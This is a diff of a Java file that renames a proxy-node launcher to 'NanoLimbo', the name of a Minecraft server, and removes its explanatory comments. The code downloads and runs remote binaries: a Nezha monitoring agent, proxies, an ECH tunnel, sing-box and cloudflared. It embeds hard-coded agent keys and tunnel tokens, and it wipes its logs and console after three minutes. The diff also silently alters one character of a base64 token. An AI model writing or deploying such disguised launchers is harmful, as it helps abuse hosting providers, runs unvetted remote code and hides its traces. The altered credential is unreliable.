@@ -1,15 +1,14 @@
-package com.example.sbx;
+package ua.nanit.limbo;
 
 import java.io.*;
 import java.net.*;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
-import java.time.Duration;
 import java.util.*;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.atomic.AtomicBoolean;
 
-public final class App {
+public final class NanoLimbo {
 
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
@@ -35,7 +34,6 @@ public final class App {
     private static final Path SUB_BASE64_PATH = RUNTIME_DIR.resolve("sub_base64.txt");
 
     public static void main(String[] args) {
-        // 检查 Java 版本 (要求 Java 10+)
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please upgrade to Java 10+!" + ANSI_RESET);
             try {
@@ -45,40 +43,33 @@ public final class App {
         }
 
         try {
-            // 1. 初始化环境变量与工作目录
             initEnvVars();
             Files.createDirectories(RUNTIME_DIR);
             cleanupOldFiles();
 
-            // 2. 启动 HTTP 保活服务器 (监听 PORT，防止容器被判断挂掉)
             int port = parsePort(ENV_MAP.get("PORT"), 3000);
             startKeepAliveServer(port);
 
-            // 3. 注册 JVM 关闭 Hook，进程退出时清理子进程
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }, "shutdown-hook"));
 
-            // 4. 拉起所有网络节点与探针服务
             startSbxServices();
 
-            // 5. 延迟 15 秒提示与 3 分钟自动清理日志/临时文件
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Logs will be cleared in 3 minutes." + ANSI_RESET);
 
-            // 3 分钟后无痕清理
             Thread cleanupThread = new Thread(() -> {
-                sleep(165000); // 180s - 15s
+                sleep(165000);
                 cleanupOldFiles();
                 clearConsole();
             }, "delayed-cleanup");
             cleanupThread.setDaemon(true);
             cleanupThread.start();
 
-            // 主线程挂起，维持进程常驻
             new CountDownLatch(1).await();
 
         } catch (Exception e) {
@@ -88,14 +79,13 @@ public final class App {
     }
 
     private static void initEnvVars() throws IOException {
-        // 设置预设默认值
         ENV_MAP.put("UUID", "faacf142-dee8-48c2-8558-641123eb939c");
         ENV_MAP.put("PORT", "3000");
         ENV_MAP.put("NEZHA_SERVER", "nezha.mingfei1981.eu.org");
         ENV_MAP.put("NEZHA_PORT", "443");
         ENV_MAP.put("NEZHA_KEY", "zkzCEmXJTLTKbh48MR");
         ENV_MAP.put("ECH_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZjM0Yjg2ZGItYmE0ZS00NjUyLWI5OTMtNGI3YjMwZjdjNTU0IiwicyI6IlpqZGxNR1ZsT1dNdE9EYzNZUzAwWXpWbUxXRTVOREF0TlRSak4yRTFNVGMyTnpJMiJ9");
-        ENV_MAP.put("VLESS_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZmU0ZjJkZjMtOGIxMi00MmRmLWI5YjAtOWUzMGY3MGVkZDM4IiwicyI6Ik9HVTFaRGxoWm1JdE1ERmhaaTAwTnpBMExUZzFORE10WmpNeE1qWXhNek0xWkdaaSJ9");
+        ENV_MAP.put("VLESS_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZmU0ZjJkZjMtOGIxMi00MmRmLWI5YjAtOWUzMGY3MGVkZDM4IiwicyI6Ik9HVTFaRGxoWm1JdE1ERmhaaTAwNnpBMExUZzFORE10WmpNeE1qWXhNek0xWkdaaSJ9");
         ENV_MAP.put("WSPORT", "8001");
         ENV_MAP.put("VLPORT", "8002");
         ENV_MAP.put("TOKEN", "babama123");
@@ -107,7 +97,6 @@ public final class App {
         ENV_MAP.put("HY_PORT", "12417");
         ENV_MAP.put("NAME", "MJJ");
 
-        // 优先覆盖环境变量
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
@@ -115,7 +104,6 @@ public final class App {
             }
         }
 
-        // 读取 .env 文件
         Path envFile = Paths.get(".env");
         if (Files.exists(envFile)) {
             for (String line : Files.readAllLines(envFile, StandardCharsets.UTF_8)) {
@@ -142,7 +130,6 @@ public final class App {
     private static void startSbxServices() throws Exception {
         String arch = getArch();
         
-        // 下载 URL 匹配
         String echUrl = "https://github.com/webappstars/ech-hug/releases/download/3.0/ech-tunnel-linux-" + arch;
         String operaUrl = "arm64".equals(arch)
                 ? "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.freebsd-arm64"
@@ -164,7 +151,6 @@ public final class App {
         int vlessPort = parsePort(ENV_MAP.get("VLPORT"), getFreePort());
         int operaPort = getFreePort();
 
-        // 1. 启动 Nezha Agent
         if (nezhaExe != null) {
             List<String> cmd = new ArrayList<>();
             cmd.add(nezhaExe.toString());
@@ -183,7 +169,6 @@ public final class App {
             startChildProcess("Nezha Agent", cmd);
         }
 
-        // 2. 启动 Opera Proxy
         if (operaExe != null) {
             List<String> cmd = List.of(
                 operaExe.toString(),
@@ -194,7 +179,6 @@ public final class App {
             startChildProcess("Opera Proxy", cmd);
         }
 
-        // 3. 启动 ECH Server
         if (echExe != null) {
             sleep(1000);
             List<String> cmd = new ArrayList<>();
@@ -209,7 +193,6 @@ public final class App {
             startChildProcess("ECH Server", cmd);
         }
 
-        // 4. 启动 sing-box (HY2 + VLESS)
         if (singboxExe != null) {
             generateCertificates();
             generateSingboxConfig(vlessPort);
@@ -217,7 +200,6 @@ public final class App {
             List<String> cmd = List.of(singboxExe.toString(), "run", "-c", SINGBOX_CONFIG_PATH.toString());
             startChildProcess("Sing-Box", cmd);
 
-            // 异步生成HY2节点订阅信息
             Thread subThread = new Thread(() -> {
                 sleep(15000);
                 generateHy2Subscription();
@@ -226,7 +208,6 @@ public final class App {
             subThread.start();
         }
 
-        // 5. 启动 Cloudflared 隧道
         if (cloudflaredExe != null) {
             try {
                 new ProcessBuilder(cloudflaredExe.toString(), "update")
@@ -312,7 +293,12 @@ public final class App {
         }
 
         Path tmp = RUNTIME_DIR.resolve(fileName + ".download");
-        URL url = new URI(urlStr).toURL();
+        URL url;
+        try {
+            url = new URI(urlStr).toURL();
+        } catch (URISyntaxException e) {
+            throw new IOException("Invalid URL: " + urlStr, e);
+        }
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setConnectTimeout(15000);
         conn.setReadTimeout(60000);
